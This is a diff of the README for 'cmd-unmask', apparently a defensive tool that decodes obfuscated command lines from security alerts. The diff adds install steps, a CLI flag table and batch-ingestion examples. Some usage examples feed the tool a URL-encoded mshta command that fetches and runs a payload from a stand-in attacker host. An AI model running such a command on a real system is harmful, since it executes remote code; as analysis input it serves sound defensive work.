@@ -70,9 +70,17 @@ During live L1/L2 alert triage, every minute spent manually baking CyberChef rec
 ---
 
 <a id="installation"></a>
-## 🚀 30-Second Quickstart
+## 📦 Installation
 
-`cmd-unmask` requires Python `>= 3.10` and installs with **zero third-party packages**:
+`cmd-unmask` requires Python `>= 3.10` and installs with **zero external dependencies** (100% Python standard library).
+
+### From Git URL
+
+```bash
+pip install git+https://github.com/VelkaRepo/cmd-unmask.git
+```
+
+### From Source
 
 ```bash
 git clone https://github.com/VelkaRepo/cmd-unmask.git
@@ -80,7 +88,28 @@ cd cmd-unmask
 pip install -e .
 ```
 
+---
+
 <a id="usage"></a>
+## 🚀 CLI Usage
+
+### CLI Options
+
+| Flag | Argument | Description | Default |
+| :--- | :--- | :--- | :--- |
+| `-c`, `--cmd` | `TEXT` | Single obfuscated command string to unmask | None |
+| `-f`, `--file` | `PATH` | Path to raw text, JSON, or JSONL input file | None |
+| `-p`, `--paste` | — | Read obfuscated command directly from OS clipboard | `False` |
+| `--field` | `NAME` | Custom JSON field name containing the command line | Auto-detect |
+| `--format` | `CHOICE` | Output format (`pretty`, `markdown`, `json`, `jsonl`) | `pretty` |
+| `--copy-note` | — | Copy the Ready-to-Paste SOC Ticket Note to the OS clipboard | `False` |
+| `--no-color` | — | Disable ANSI colors in pretty terminal output | `False` |
+| `--no-defang` | — | Emit raw IOCs instead of defanged IOCs | `False` |
+| `--max-depth` | `INT` | Maximum Unpacking DAG recursion depth | `10` |
+| `--timeout` | `FLOAT` | Per-command unpacking timeout in seconds | `3.0` |
+| `--fail-on` | `SEV` | Exit code 2 if severity meets or exceeds `LOW`, `MEDIUM`, `HIGH`, `CRITICAL` | None |
+| `-h`, `--help` | — | Show CLI help message and exit | — |
+
 ### 1. Clipboard & Interactive Mode (Avoids Local CLI Inspection Blocks)
 Passing raw malicious stagers directly as command-line arguments (`-c "powershell -enc ..."`) often triggers local Windows Defender / SentinelOne CLI blocks (`Access is denied`). Ingesting directly from the OS clipboard avoids exposing the payload in the process argument list. Copy the alert command from your SIEM and run:
 
@@ -104,20 +133,7 @@ cmd-unmask -c "mshta.exe http%3A%2F%2Fevil.example%2Fpayload.hta" --no-color --n
 echo "mshta.exe http%3A%2F%2Fevil.example%2Fpayload.hta" | cmd-unmask --format json
 ```
 
----
-
-## 🖥️ Live Terminal Output
-
-<!-- demo.gif goes here after recording -->
-
-By default (`--format pretty`), `cmd-unmask` renders a 4-part operator view with human-readable transformation steps and a borderless Section `[4]` designed for direct terminal highlight-and-copy.
-
-See the complete [Live Terminal Output Example](docs/architecture.md#live-terminal-output) in [`docs/architecture.md`](docs/architecture.md).
-
----
-
-## 📦 Batch SIEM & EDR Ingestion
-
+### 3. Batch SIEM & EDR Ingestion
 `cmd-unmask` natively ingests raw line-delimited text files, JSON arrays, and JSONL exports from **QRadar, Wazuh, SentinelOne, FortiGate, and ArcSight**. It auto-detects standard command-line fields (`CommandLine`, `command_line`, `cmd`, `process.command_line`, `data.win.eventdata.commandLine`, `payload`), unescapes outer JSON wrapper quotes (`\"` -> `"`), and isolates malformed records so a corrupt log line never crashes a batch run:
 
 ```bash
@@ -127,6 +143,16 @@ cmd-unmask -f alerts.jsonl --format jsonl > triaged_alerts.jsonl
 # Specify a custom JSON key and enforce a CI/SOAR severity exit gate (exit code 2 on HIGH or CRITICAL)
 cmd-unmask -f qradar_offense.json --field CustomProcessCmd --fail-on HIGH
 ```
+
+---
+
+## 🖥️ Live Terminal Output
+
+<!-- demo.gif goes here after recording -->
+
+By default (`--format pretty`), `cmd-unmask` renders a 4-part operator view with human-readable transformation steps and a borderless Section `[4]` designed for direct terminal highlight-and-copy.
+
+See the complete [Live Terminal Output Example](docs/architecture.md#live-terminal-output) in [`docs/architecture.md`](docs/architecture.md).
 
 ---
 
